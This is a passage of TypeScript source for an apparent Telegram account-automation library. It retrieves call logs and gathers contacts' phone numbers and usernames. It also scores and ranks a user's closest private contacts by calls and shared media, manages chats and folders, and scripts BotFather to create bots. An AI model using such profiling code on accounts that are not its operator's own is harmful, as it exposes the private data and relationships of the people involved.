true;\r\n\r\n    try {\r\n        const maxLimit = Math.min(Math.max(limit, 1), 10000);\r\n        const chunkSize = 200;\r\n        const callLogs: (Api.Message | Api.MessageService)[] = [];\r\n        let offsetId = 0;\r\n\r\n        while (callLogs.length < maxLimit) {\r\n            const result = <Api.messages.Messages>await ctx.client.invoke(\r\n                new Api.messages.Search({\r\n                    peer: new Api.InputPeerEmpty(),\r\n                    q: '',\r\n                    filter: new Api.InputMessagesFilterPhoneCalls({}),\r\n                    minDate: 0,\r\n                    maxDate: 0,\r\n                    offsetId,\r\n                    addOffset: 0,\r\n                    limit: chunkSize,\r\n                    maxId: 0,\r\n                    minId: 0,\r\n                    hash: bigInt(0),\r\n                })\r\n            );\r\n\r\n            const messages = result.messages || [];\r\n            const batch = messages.filter(\r\n                (m): m is Api.Message | Api.MessageService =>\r\n                    (m instanceof Api.Message || m instanceof Api.MessageService) &&\r\n                    m.action instanceof Api.MessageActionPhoneCall\r\n            );\r\n            callLogs.push(...batch);\r\n            if (messages.length < chunkSize) break;\r\n            const lastMessage = messages[messages.length - 1];\r\n            if (lastMessage) offsetId = lastMessage.id;\r\n            if (callLogs.length >= maxLimit) break;\r\n        }\r\n\r\n        const stats = {\r\n            outgoing: 0,\r\n            incoming: 0,\r\n            video: 0,\r\n            audio: 0,\r\n            totalCalls: 0,\r\n        };\r\n        const rawChatStats: Record<string, {\r\n            count: number;\r\n            outgoing: number;\r\n            incoming: number;\r\n            video: number;\r\n            peerType: 'user' | 'group' | 'channel';\r\n        }> = {};\r\n        for (const msg of callLogs) {\r\n            const action = msg.action as Api.MessageActionPhoneCall;\r\n            if (!action) continue;\r\n            stats.totalCalls++;\r\n            if (msg.out) stats.outgoing++;\r\n            else stats.incoming++;\r\n            if (action.video) stats.video++;\r\n            else stats.audio++;\r\n            let chatId: string;\r\n            let peerType: 'user' | 'group' | 'channel' = 'user';\r\n\r\n            if (msg.peerId instanceof Api.PeerUser) {\r\n                chatId = msg.peerId.userId.toString();\r\n                peerType = 'user';\r\n            } else if (msg.peerId instanceof Api.PeerChat) {\r\n                chatId = msg.peerId.chatId.toString();\r\n                peerType = 'group';\r\n            } else if (msg.peerId instanceof Api.PeerChannel) {\r\n                chatId = msg.peerId.channelId.toString();\r\n                peerType = 'channel';\r\n            } else {\r\n                continue;\r\n            }\r\n\r\n            if (!rawChatStats[chatId]) {\r\n                rawChatStats[chatId] = { count: 0, outgoing: 0, incoming: 0, video: 0, peerType };\r\n            }\r\n            const r = rawChatStats[chatId];\r\n            r.count++;\r\n            if (msg.out) r.outgoing++;\r\n            else r.incoming++;\r\n            if (action.video) r.video++;\r\n        }\r\n\r\n        let callLogByChat: Record<string, CallLogEntry[]> = {};\r\n        if (includeCallLog) {\r\n            for (const msg of callLogs) {\r\n                const action = msg.action as Api.MessageActionPhoneCall;\r\n                if (!action) continue;\r\n                let chatId: string;\r\n                if (msg.peerId instanceof Api.PeerUser) {\r\n                    chatId = msg.peerId.userId.toString();\r\n                } else if (msg.peerId instanceof Api.PeerChat) {\r\n                    chatId = msg.peerId.chatId.toString();\r\n                } else if (msg.peerId instanceof Api.PeerChannel) {\r\n                    chatId = msg.peerId.channelId.toString();\r\n                } else continue;\r\n                if (!callLogByChat[chatId]) callLogByChat[chatId] = [];\r\n                callLogByChat[chatId].push({\r\n                    messageId: msg.id,\r\n                    date: msg.date ?? 0,\r\n                    durationSeconds: action.duration ?? 0,\r\n                    video: !!action.video,\r\n                    outgoing: !!msg.out,\r\n                });\r\n            }\r\n            for (const arr of Object.values(callLogByChat)) {\r\n                arr.sort((a, b) => b.date - a.date);\r\n            }\r\n        }\r\n\r\n        const uniqueChatIds = Object.keys(rawChatStats);\r\n        const entityCache = new Map<string, {\r\n            name: string;\r\n            phone?: string;\r\n            username?: string;\r\n            peerType: 'user' | 'group' | 'channel';\r\n        }>();\r\n        await Promise.all(\r\n            uniqueChatIds.map(async (chatId) => {\r\n                try {\r\n                    const entity = await ctx.client.getEntity(chatId);\r\n                    if (entity instanceof Api.User) {\r\n                        entityCache.set(chatId, {\r\n                            phone: entity.phone,\r\n                            username: entity.username ?? undefined,\r\n                            name: [entity.firstName, entity.lastName].filter(Boolean).join(' ').trim() || 'Deleted Account',\r\n                            peerType: 'user',\r\n                        });\r\n                    } else if (entity instanceof Api.Chat) {\r\n                        entityCache.set(chatId, {\r\n                            name: entity.title || 'Unknown Group',\r\n                            peerType: 'group',\r\n                        });\r\n                    } else if (entity instanceof Api.Channel) {\r\n                        entityCache.set(chatId, {\r\n                            username: entity.username ?? undefined,\r\n                            name: entity.title || 'Unknown Channel',\r\n                            peerType: 'channel',\r\n                        });\r\n                    } else {\r\n                        entityCache.set(chatId, { name: 'Unknown', peerType: 'user' });\r\n                    }\r\n                } catch (err) {\r\n                    ctx.logger?.warn?.(`Failed to get entity ${chatId}:`, err);\r\n                    entityCache.set(chatId, { name: 'Unknown / Restricted', peerType: 'user' });\r\n                }\r\n            })\r\n        );\r\n\r\n        const chats: CallLogChat[] = [];\r\n        for (const chatId of uniqueChatIds) {\r\n            const base = entityCache.get(chatId)!;\r\n            const r = rawChatStats[chatId];\r\n            const callLog = includeCallLog ? (callLogByChat[chatId] ?? []) : undefined;\r\n            let totalMessages: number | undefined;\r\n            let photoCount = 0;\r\n            let videoCount = 0;\r\n            try {\r\n                const inputPeer = await ctx.client.getInputEntity(chatId);\r\n                const [photosRes, videosRes, historyRes] = await Promise.all([\r\n                    ctx.client.invoke(\r\n                        new Api.messages.Search({\r\n                            peer: inputPeer,\r\n                            q: \"\",\r\n                            filter: new Api.InputMessagesFilterPhotos(),\r\n                            minDate: 0,\r\n                            maxDate: 0,\r\n                            offsetId: 0,\r\n                            addOffset: 0,\r\n                            limit: 1,\r\n                            maxId: 0,\r\n                            minId: 0,\r\n                        })\r\n                    ).catch(() => ({ count: 0 })),\r\n                    ctx.client.invoke(\r\n                        new Api.messages.Search({\r\n                            peer: inputPeer,\r\n                            q: \"\",\r\n                            filter: new Api.InputMessagesFilterVideo(),\r\n                            minDate: 0,\r\n                            maxDate: 0,\r\n                            offsetId: 0,\r\n                            addOffset: 0,\r\n                            limit: 1,\r\n                            maxId: 0,\r\n                            minId: 0,\r\n                        })\r\n                    ).catch(() => ({ count: 0 })),\r\n                    ctx.client.invoke(\r\n                        new Api.messages.GetHistory({\r\n                            peer: inputPeer,\r\n                            offsetId: 0,\r\n                            offsetDate: 0,\r\n                            addOffset: 0,\r\n                            limit: 1,\r\n                            maxId: 0,\r\n                            minId: 0,\r\n                            hash: bigInt(0),\r\n                        })\r\n                    ).catch(() => ({ messages: [] })),\r\n                ]);\r\n                if (historyRes && 'count' in historyRes) totalMessages = historyRes.count;\r\n                photoCount = (photosRes as { count?: number }).count ?? 0;\r\n                videoCount = (videosRes as { count?: number }).count ?? 0;\r\n            } catch (e) {\r\n                ctx.logger?.warn?.(`Failed to fetch media/total for ${chatId}:`, e);\r\n            }\r\n            chats.push({\r\n                chatId,\r\n                phone: base.phone,\r\n                username: base.username,\r\n                name: base.name,\r\n                peerType: base.peerType,\r\n                calls: {\r\n                    total: r.count,\r\n                    outgoing: r.outgoing,\r\n                    incoming: r.incoming,\r\n                    video: r.video,\r\n                    audio: r.count - r.video,\r\n                },\r\n                totalMessages,\r\n                photoCount,\r\n                videoCount,\r\n                ...(includeCallLog && callLog !== undefined ? { callLog } : {}),\r\n            });\r\n        }\r\n        chats.sort((a, b) => b.calls.total - a.calls.total);\r\n\r\n        ctx.logger?.info?.(ctx.phoneNumber, 'Call log summary', {\r\n            totalCalls: stats.totalCalls,\r\n            outgoing: stats.outgoing,\r\n            incoming: stats.incoming,\r\n            video: stats.video,\r\n            audio: stats.audio,\r\n            uniqueChats: chats.length,\r\n        });\r\n\r\n        return {\r\n            totalCalls: stats.totalCalls,\r\n            outgoing: stats.outgoing,\r\n            incoming: stats.incoming,\r\n            video: stats.video,\r\n            audio: stats.audio,\r\n            chats,\r\n        };\r\n    } catch (error) {\r\n        ctx.logger?.error?.(ctx.phoneNumber, 'getCallLog failed:', error);\r\n        throw error;\r\n    }\r\n}\r\n// ---- Chat stats ----\r\n\r\nexport async function getChatStatistics(ctx: TgContext, chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const now = Math.floor(Date.now() / 1000);\r\n    const periodInSeconds = { day: 24 * 60 * 60, week: 7 * 24 * 60 * 60, month: 30 * 24 * 60 * 60 }[period];\r\n\r\n    const messages = await ctx.client.getMessages(chatId, { limit: 100, offsetDate: now - periodInSeconds });\r\n\r\n    return {\r\n        period,\r\n        totalMessages: messages.length,\r\n        uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,\r\n        messageTypes: {\r\n            text: messages.filter(m => !m.media && m.message).length,\r\n            photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,\r\n            video: messages.filter(m => {\r\n                if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\r\n                const doc = (m.media as Api.MessageMediaDocument).document;\r\n                return doc && 'mimeType' in doc && (doc as Api.Document).mimeType?.startsWith('video/');\r\n            }).length,\r\n            voice: messages.filter(m => {\r\n                if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\r\n                const doc = (m.media as Api.MessageMediaDocument).document;\r\n                return doc && 'mimeType' in doc && (doc as Api.Document).mimeType?.startsWith('audio/');\r\n            }).length,\r\n            other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length,\r\n        },\r\n        topSenders: await (async () => {\r\n            const rawSenders = Object.entries(\r\n                messages.reduce((acc, msg) => {\r\n                    const senderId = msg.fromId?.toString();\r\n                    if (senderId) acc[senderId] = (acc[senderId] || 0) + 1;\r\n                    return acc;\r\n                }, {} as Record<string, number>)\r\n            ).sort(([, a], [, b]) => b - a).slice(0, 10);\r\n\r\n            return Promise.all(rawSenders.map(async ([id, count]): Promise<TopSenderInfo> => {\r\n                let name = 'Unknown';\r\n                let username: string | null = null;\r\n                try {\r\n                    const entity = await safeGetEntityById(ctx, id);\r\n                    if (entity instanceof Api.User) {\r\n                        name = `${entity.firstName || ''} ${entity.lastName || ''}`.trim() || 'Unknown';\r\n                        username = entity.username || null;\r\n                    } else if (entity instanceof Api.Channel) {\r\n                        name = entity.title || 'Unknown';\r\n                        username = entity.username || null;\r\n                    } else if (entity instanceof Api.Chat) {\r\n                        name = entity.title || 'Unknown';\r\n                    }\r\n                } catch { /* ignore */ }\r\n                return { id, name, username, count };\r\n            }));\r\n        })(),\r\n        mostActiveHours: Object.entries(\r\n            messages.reduce((acc, msg) => {\r\n                const hour = new Date(msg.date * 1000).getHours();\r\n                acc[hour] = (acc[hour] || 0) + 1;\r\n                return acc;\r\n            }, {} as Record<number, number>)\r\n        ).sort(([, a], [, b]) => b - a).map(([hour, count]) => ({ hour: Number(hour), count })),\r\n    };\r\n}\r\n\r\nexport async function getMessageStats(ctx: TgContext, options: {\r\n    chatId: string; period: 'day' | 'week' | 'month'; fromDate?: Date;\r\n}): Promise<MessageStats> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const now = options.fromDate || new Date();\r\n    const startDate = new Date(now);\r\n    switch (options.period) {\r\n        case 'day': startDate.setDate(startDate.getDate() - 1); break;\r\n        case 'week': startDate.setDate(startDate.getDate() - 7); break;\r\n        case 'month': startDate.setMonth(startDate.getMonth() - 1); break;\r\n    }\r\n\r\n    const messages = await ctx.client.getMessages(options.chatId, {\r\n        limit: 100, offsetDate: Math.floor(now.getTime() / 1000),\r\n    });\r\n\r\n    const gmt = getMediaType;\r\n    const stats: MessageStats = {\r\n        total: messages.length, withMedia: 0, withLinks: 0, withForwards: 0,\r\n        byHour: new Array(24).fill(0),\r\n        byType: { text: 0, photo: 0, video: 0, document: 0, other: 0 },\r\n    };\r\n\r\n    for (const msg of messages) {\r\n        const hour = new Date(msg.date * 1000).getHours();\r\n        stats.byHour[hour]++;\r\n        if (msg.media) {\r\n            stats.withMedia++;\r\n            const mediaType = gmt(msg.media);\r\n            stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;\r\n        } else if (msg.message) {\r\n            if (msg.message.match(/https?:\\/\\/[^\\s]+/)) stats.withLinks++;\r\n            stats.byType.text++;\r\n        }\r\n        if (msg.fwdFrom) stats.withForwards++;\r\n    }\r\n\r\n    return stats;\r\n}\r\n\r\n// ---- Chat list ----\r\n\r\nexport async function getChats(ctx: TgContext, options: {\r\n    limit?: number; offsetDate?: number; folderId?: number; archived?: boolean; peerType?: 'all' | 'user' | 'group' | 'channel'; ignorePinned?: boolean; includePhotos?: boolean;\r\n}): Promise<ChatListResult> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const dialogs: Dialog[] = [];\r\n    const limit = options.limit || 100;\r\n    const includePhotos = options.includePhotos || false;\r\n    const peerType = options.peerType ?? 'all';\r\n    const folder = options.folderId !== undefined ? options.folderId : (options.archived ? 1 : 0);\r\n    const requestLimit = peerType === 'all' ? limit : Math.min(limit * 3, 100);\r\n    const params: Parameters<typeof ctx.client.iterDialogs>[0] = { limit: requestLimit, folder, ignorePinned: options.ignorePinned ?? false };\r\n    if (options.offsetDate != null && options.offsetDate > 0) params.offsetDate = options.offsetDate;\r\n    const me = await ctx.client.getMe();\r\n\r\n    for await (const dialog of ctx.client.iterDialogs(params)) {\r\n        const entity = dialog.entity;\r\n        const match =\r\n            peerType === 'all' ||\r\n            (peerType === 'user' && entity instanceof Api.User) ||\r\n            (peerType === 'group' && entity instanceof Api.Chat) ||\r\n            (peerType === 'channel' && entity instanceof Api.Channel);\r\n        if (match) dialogs.push(dialog);\r\n        if (dialogs.length >= limit) break;\r\n    }\r\n\r\n    const last = dialogs[dialogs.length - 1];\r\n    const hasMore = dialogs.length === limit;\r\n    const nextOffsetDate = hasMore && last?.message?.date != null ? last.message.date : undefined;\r\n\r\n    const items = await Promise.all(dialogs.map(async (dialog: Dialog) => {\r\n        const entity = dialog.entity;\r\n        const type: 'user' | 'group' | 'channel' | 'unknown' =\r\n            entity instanceof Api.User ? 'user' :\r\n                entity instanceof Api.Chat ? 'group' :\r\n                    entity instanceof Api.Channel ? 'channel' : 'unknown';\r\n\r\n        // Resolve last message sender name\r\n        let senderName: string | null = null;\r\n        if (dialog.message?.senderId) {\r\n            try {\r\n                if (dialog.message.senderId.toString() === me.id.toString()) {\r\n                    senderName = `${me.firstName || ''} ${me.lastName || ''} (Self)`.trim();\r\n                } else {\r\n                    if (type === 'user') {\r\n                        const senderEntity = await safeGetEntityById(ctx, dialog.message.senderId.toString());\r\n                        if (senderEntity instanceof Api.User) {\r\n                            senderName = `${senderEntity.firstName || ''} ${senderEntity.lastName || ''}`.trim() || senderEntity.username || null;\r\n                        } else {\r\n                            senderName = \"Unknown\";\r\n                        }\r\n                    } else {\r\n                        senderName = dialog.title || \"Unknown Channel User\";\r\n                    }\r\n                }\r\n            } catch {\r\n                senderName = \"Unknown\";\r\n            }\r\n        }\r\n\r\n        // Online status & last seen (only for users)\r\n        let onlineStatus: string | null = null;\r\n        let lastSeen: string | null = null;\r\n        if (entity instanceof Api.User) {\r\n            const status = getUserOnlineStatus(entity);\r\n            onlineStatus = status.status;\r\n            lastSeen = status.lastSeen;\r\n        }\r\n\r\n        // Mute status\r\n        const muteUntil = dialog.dialog?.notifySettings?.muteUntil;\r\n        const isMuted = muteUntil ? muteUntil > Math.floor(Date.now() / 1000) : false;\r\n\r\n        // Participant count\r\n        let participantCount: number | null = null;\r\n        if (entity instanceof Api.Chat) {\r\n            participantCount = entity.participantsCount ?? null;\r\n        } else if (entity instanceof Api.Channel) {\r\n            participantCount = entity.participantsCount ?? null;\r\n        }\r\n\r\n        // Chat photo (opt-in)\r\n        let photoBase64: string | null = null;\r\n        if (includePhotos && 'photo' in entity && entity.photo && !(entity.photo instanceof Api.ChatPhotoEmpty)) {\r\n            try {\r\n                const photoResult = await ctx.client.downloadProfilePhoto(entity, { isBig: false });\r\n                if (photoResult && Buffer.isBuffer(photoResult) && (photoResult as Buffer).length > 0) {\r\n                    photoBase64 = bufferToBase64DataUrl(photoResult as Buffer);\r\n                }\r\n            } catch { /* ignore photo download failures */ }\r\n        }\r\n\r\n        return {\r\n            id: entity.id.toString(),\r\n            title: entity.id.toString() === me.id.toString() ? `${dialog.title} (Self)` : dialog.title ? dialog.title : 'title' in entity ? entity.title : null,\r\n            username: 'username' in entity ? entity.username : null,\r\n            type,\r\n            unreadCount: dialog.unreadCount,\r\n            lastMessage: dialog.message ? {\r\n                id: dialog.message.id,\r\n                text: dialog.message.message,\r\n                date: toISODate(dialog.message.date),\r\n                senderName,\r\n            } : null,\r\n            photoBase64,\r\n            onlineStatus,\r\n            lastSeen,\r\n            isMuted,\r\n            participantCount,\r\n        };\r\n    }));\r\n\r\n    return { items, hasMore, ...(nextOffsetDate != null && { nextOffsetDate }) };\r\n}\r\n\r\nexport async function updateChatSettings(ctx: TgContext, settings: ChatSettingsUpdate): Promise<boolean> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const chat = await ctx.client.getEntity(settings.chatId);\r\n    const updates: Promise<Api.TypeUpdates | boolean>[] = [];\r\n\r\n    if (settings.title) {\r\n        updates.push(ctx.client.invoke(new Api.channels.EditTitle({ channel: chat, title: settings.title })));\r\n    }\r\n    if (settings.about) {\r\n        updates.push(ctx.client.invoke(new Api.messages.EditChatAbout({ peer: chat, about: settings.about })));\r\n    }\r\n    if (settings.photo) {\r\n        const buffer = await downloadFileFromUrl(settings.photo);\r\n        const file = await ctx.client.uploadFile({\r\n            file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer), workers: 1,\r\n        });\r\n        updates.push(ctx.client.invoke(new Api.channels.EditPhoto({\r\n            channel: chat, photo: new Api.InputChatUploadedPhoto({ file }),\r\n        })));\r\n    }\r\n    if (settings.slowMode !== undefined) {\r\n        updates.push(ctx.client.invoke(new Api.channels.ToggleSlowMode({ channel: chat, seconds: settings.slowMode })));\r\n    }\r\n    if (settings.linkedChat) {\r\n        const linkedChannel = await ctx.client.getEntity(settings.linkedChat);\r\n        updates.push(ctx.client.invoke(new Api.channels.SetDiscussionGroup({ broadcast: chat, group: linkedChannel })));\r\n    }\r\n    if (settings.username) {\r\n        updates.push(ctx.client.invoke(new Api.channels.UpdateUsername({ channel: chat, username: settings.username })));\r\n    }\r\n\r\n    await Promise.all(updates);\r\n    return true;\r\n}\r\n\r\n// ---- Chat folders ----\r\n\r\nexport async function createChatFolder(ctx: TgContext, options: ChatFolderCreateOptions): Promise<{\r\n    id: number; name: string; options: Record<string, boolean>;\r\n}> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const folder = new Api.DialogFilter({\r\n        id: Math.floor(Math.random() * 1000),\r\n        title: new Api.TextWithEntities({ text: options.name, entities: [] }),\r\n        includePeers: await Promise.all(options.includedChats.map(id => ctx.client.getInputEntity(id))),\r\n        excludePeers: await Promise.all((options.excludedChats || []).map(id => ctx.client.getInputEntity(id))),\r\n        pinnedPeers: [],\r\n        contacts: options.includeContacts ?? true,\r\n        nonContacts: options.includeNonContacts ?? true,\r\n        groups: options.includeGroups ?? true,\r\n        broadcasts: options.includeBroadcasts ?? true,\r\n        bots: options.includeBots ?? true,\r\n        excludeMuted: options.excludeMuted ?? false,\r\n        excludeRead: options.excludeRead ?? false,\r\n        excludeArchived: options.excludeArchived ?? false,\r\n    });\r\n\r\n    await ctx.client.invoke(new Api.messages.UpdateDialogFilter({ id: folder.id, filter: folder }));\r\n\r\n    return {\r\n        id: folder.id, name: options.name,\r\n        options: {\r\n            includeContacts: folder.contacts, includeNonContacts: folder.nonContacts,\r\n            includeGroups: folder.groups, includeBroadcasts: folder.broadcasts,\r\n            includeBots: folder.bots, excludeMuted: folder.excludeMuted,\r\n            excludeRead: folder.excludeRead, excludeArchived: folder.excludeArchived,\r\n        },\r\n    };\r\n}\r\n\r\nexport async function getChatFolders(ctx: TgContext): Promise<ChatFolder[]> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const filters = await ctx.client.invoke(new Api.messages.GetDialogFilters());\r\n    return (filters.filters || []).map((filter: Api.TypeDialogFilter) => ({\r\n        id: (filter as Api.DialogFilter).id ?? 0,\r\n        title: ((filter as Api.DialogFilter).title as unknown as string) ?? '',\r\n        includedChatsCount: Array.isArray((filter as Api.DialogFilter).includePeers) ? (filter as Api.DialogFilter).includePeers.length : 0,\r\n        excludedChatsCount: Array.isArray((filter as Api.DialogFilter).excludePeers) ? (filter as Api.DialogFilter).excludePeers.length : 0,\r\n    }));\r\n}\r\n\r\n// ---- Top private chats ----\r\n\r\nasync function analyzeChatEngagement(\r\n    ctx: TgContext, chatId: string, user: Api.User,\r\n    weights: EngagementWeights, now: number,\r\n    dialog?: Dialog, callStats?: PerChatCallStats\r\n): Promise<TopPrivateChat | null> {\r\n    const lastMessage = await ctx.client.getMessages(chatId, { limit: 1 });\r\n    if ((lastMessage?.total ?? 0) < 10) return null;\r\n\r\n    const [photosList, videosList, photosByUsList, videosByUsList] = await Promise.all([\r\n        ctx.client.getMessages(chatId, { filter: new Api.InputMessagesFilterPhotos(), limit: 1 }).catch(() => []),\r\n        ctx.client.getMessages(chatId, { filter: new Api.InputMessagesFilterVideo(), limit: 1 }).catch(() => []),\r\n        ctx.client.getMessages(chatId, { filter: new Api.InputMessagesFilterPhotos(), limit: 1, fromUser: 'me' }).catch(() => []),\r\n        ctx.client.getMessages(chatId, { filter: new Api.InputMessagesFilterVideo(), limit: 1, fromUser: 'me' }).catch(() => []),\r\n    ]);\r\n\r\n    const totalPhotos = (photosList as { total?: number })?.total ?? 0;\r\n    const totalVideos = (videosList as { total?: number })?.total ?? 0;\r\n    const photosByUs = (photosByUsList as { total?: number })?.total ?? 0;\r\n    const videosByUs = (videosByUsList as { total?: number })?.total ?? 0;\r\n    const mediaStats = {\r\n        photos: totalPhotos, videos: totalVideos, photosByUs,\r\n        photosByThem: Math.max(0, totalPhotos - photosByUs),\r\n        videosByUs, videosByThem: Math.max(0, totalVideos - videosByUs),\r\n    };\r\n\r\n    const lastMessageDate = dialog?.message?.date ? dialog.message.date * 1000 : now;\r\n    const daysSinceLastActivity = (now - lastMessageDate) / (1000 * 60 * 60 * 24);\r\n    const cCalls = callStats ?? { outgoing: 0, incoming: 0, video: 0, total: 0 };\r\n    const baseScore = (\r\n        cCalls.incoming * weights.incomingCall +\r\n        cCalls.outgoing * weights.outgoingCall +\r\n        cCalls.video * weights.videoCall +\r\n        mediaStats.videos * weights.sharedVideo +\r\n        mediaStats.photos * weights.sharedPhoto\r\n    );\r\n\r\n    const engagementLevel: 'recent' | 'active' | 'dormant' = baseScore > 0 ? 'active' : 'dormant';\r\n    const totalActivity = Math.max(1, baseScore);\r\n    const activityBreakdown = {\r\n        videoCalls: Math.round((cCalls.video * weights.videoCall / totalActivity) * 100),\r\n        audioCalls: Math.round(((cCalls.total - cCalls.video) * (weights.incomingCall || weights.outgoingCall) / totalActivity) * 100),\r\n        mediaSharing: Math.round(((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto) / totalActivity) * 100),\r\n        textMessages: lastMessage.total ?? 0,\r\n    };\r\n\r\n    return {\r\n        chatId: user.id.toString(),\r\n        username: user.username,\r\n        firstName: user.firstName || (chatId === 'me' ? 'Saved Messages' : ''),\r\n        lastName: user.lastName,\r\n        totalMessages: lastMessage.total ?? 0,\r\n        interactionScore: baseScore,\r\n        engagementLevel,\r\n        lastActivityDays: Math.round(daysSinceLastActivity * 10) / 10,\r\n        calls: {\r\n            total: cCalls.total || 0,\r\n            incoming: { total: cCalls.incoming || 0, audio: Math.max(0, cCalls.incoming - cCalls.video) || 0, video: cCalls.video || 0 },\r\n            outgoing: { total: cCalls.outgoing || 0, audio: cCalls.outgoing || 0, video: 0 },\r\n        },\r\n        media: mediaStats,\r\n        activityBreakdown,\r\n    };\r\n}\r\n\r\nexport async function getTopPrivateChats(ctx: TgContext, limit: number = 10): Promise<TopPrivateChat[]> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const clampedLimit = Math.max(1, Math.min(50, limit || 10));\r\n    ctx.logger.info(ctx.phoneNumber, `Starting getTopPrivateChats (private + self only, unique), limit=${clampedLimit}...`);\r\n\r\n    const startTime = Date.now();\r\n    const now = Date.now();\r\n\r\n    const weights: EngagementWeights = {\r\n        videoCall: 2, incomingCall: 4, outgoingCall: 1,\r\n        sharedVideo: 12, sharedPhoto: 10, textMessage: 1, unreadMessages: 1,\r\n    };\r\n\r\n    const [me, callLogResult, dialogs] = await Promise.all([\r\n        getMe(ctx).catch(() => null),\r\n        getCallLog(ctx, 300).catch(() => ({ totalCalls: 0, outgoing: 0, incoming: 0, video: 0, audio: 0, chats: [] })),\r\n        ctx.client.getDialogs({ limit: 350 }),\r\n    ]);\r\n\r\n    if (!me) throw new Error('Failed to fetch self userInfo');\r\n    const selfChatId = me.id.toString();\r\n\r\n    // Only private user chats: skip channels and groups (explicit entity check)\r\n    const privateUserDialogs = Array.from(dialogs).filter(\r\n        (d): d is Dialog => !!d.isUser && d.entity instanceof Api.User\r\n    );\r\n    // Unique by chatId and exclude self (self is handled separately to avoid duplicate)\r\n    const seenIds = new Set<string>();\r\n    const candidateChats = privateUserDialogs.filter((d) => {\r\n        const id = (d.entity as Api.User).id.toString();\r\n        if (id === selfChatId || seenIds.has(id)) return false;\r\n        seenIds.add(id);\r\n        return true;\r\n    });\r\n\r\n    const callLogsByChat = Object.fromEntries((callLogResult.chats ?? []).map(c => [c.chatId, c.calls]));\r\n\r\n    // Self chat (Saved Messages)  fetch once, excluded from dialogs so no duplicate\r\n    let selfChatData: TopPrivateChat | null = null;\r\n    try {\r\n        selfChatData = await analyzeChatEngagement(ctx, 'me', me, weights, now, undefined, callLogsByChat[selfChatId]);\r\n        if (selfChatData) ctx.logger.info(ctx.phoneNumber, `Self chat - Score: ${selfChatData.interactionScore}`);\r\n    } catch (e) {\r\n        ctx.logger.warn(ctx.phoneNumber, 'Error processing self chat:', e);\r\n    }\r\n\r\n    const topCandidates = candidateChats.slice(0, Math.min(clampedLimit * 4, 49));\r\n    ctx.logger.info(ctx.phoneNumber, `Analyzing ${topCandidates.length} unique private chats...`);\r\n\r\n    const chatStats: TopPrivateChat[] = [];\r\n    const batchSize = 10;\r\n\r\n    for (let i = 0; i < topCandidates.length; i += batchSize) {\r\n        const batch = topCandidates.slice(i, i + batchSize);\r\n        const batchResults = await Promise.all(batch.map(async (candidate) => {\r\n            const user = candidate.entity as Api.User;\r\n            const chatId = user.id.toString();\r\n            try {\r\n                return await analyzeChatEngagement(ctx, chatId, user, weights, now, candidate, callLogsByChat[chatId]);\r\n            } catch (error) {\r\n                ctx.logger.warn(ctx.phoneNumber, `Error analyzing chat ${chatId}:`, (error as Error).message);\r\n                return null;\r\n            }\r\n        }));\r\n        chatStats.push(...batchResults.filter((r): r is TopPrivateChat => r !== null));\r\n    }\r\n\r\n    // Combine self + others, sort by score desc, dedupe by chatId, then take limit\r\n    const allChats: TopPrivateChat[] = [...(selfChatData ? [selfChatData] : []), ...chatStats];\r\n    const byScore = allChats.sort((a, b) => b.interactionScore - a.interactionScore);\r\n    const uniqueByChatId: TopPrivateChat[] = [];\r\n    const resultIds = new Set<string>();\r\n    for (const chat of byScore) {\r\n        const id = chat.chatId;\r\n        if (resultIds.has(id)) continue;\r\n        resultIds.add(id);\r\n        uniqueByChatId.push(chat);\r\n    }\r\n    const topChats = uniqueByChatId.slice(0, clampedLimit);\r\n\r\n    ctx.logger.info(ctx.phoneNumber, `getTopPrivateChats completed in ${Date.now() - startTime}ms. Returning ${topChats.length} unique chats (sorted by score).`);\r\n    return topChats;\r\n}\r\n\r\n// ---- Bot creation ----\r\n\r\nexport async function createBot(ctx: TgContext, options: {\r\n    name: string; username: string; description?: string; aboutText?: string; profilePhotoUrl?: string;\r\n}): Promise<{ botToken: string; username: string }> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const botFatherUsername = 'BotFather';\r\n    ctx.logger.info(ctx.phoneNumber, `[BOT CREATION] Starting bot creation process for \"${options.name}\" (${options.username})`);\r\n\r\n    try {\r\n        const entity = await ctx.client.getEntity(botFatherUsername);\r\n        ctx.logger.info(ctx.phoneNumber, '[BOT CREATION] Successfully connected to BotFather');\r\n\r\n        await ctx.client.sendMessage(entity, { message: '/newbot' });\r\n        await new Promise(resolve => setTimeout(resolve, 1000));\r\n\r\n        await ctx.client.sendMessage(entity, { message: options.name });\r\n        await new Promise(resolve => setTimeout(resolve, 1000));\r\n\r\n        let botUsername = options.username;\r\n        if (!/_bot$/.test(botUsername)) {\r\n            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\r\n            let uniqueSuffix = '';\r\n            for (let i = 0; i < 3; i++) uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));\r\n            botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;\r\n            ctx.logger.info(ctx.phoneNumber, `[BOT CREATION] Modified username: ${botUsername}`);\r\n        }\r\n\r\n        await ctx.client.sendMessage(entity, { message: botUsername });\r\n        await new Promise(resolve => setTimeout(resolve, 1000));\r\n\r\n        const messages = await ctx.client.getMessages(entity, { limit: 1 });\r\n        if (!messages || messages.length === 0) throw new Error('No response received from BotFather');\r\n\r\n        const lastMessage = messages[0].message;\r\n        if (!lastMessage.toLowerCase().includes('use this token')) throw new Error(`Bot creation failed: ${lastMessage}`);\r\n\r\n        const tokenMatch = lastMessage.match(/(\\d+:[A-Za-z0-9_-]+)/);\r\n        if 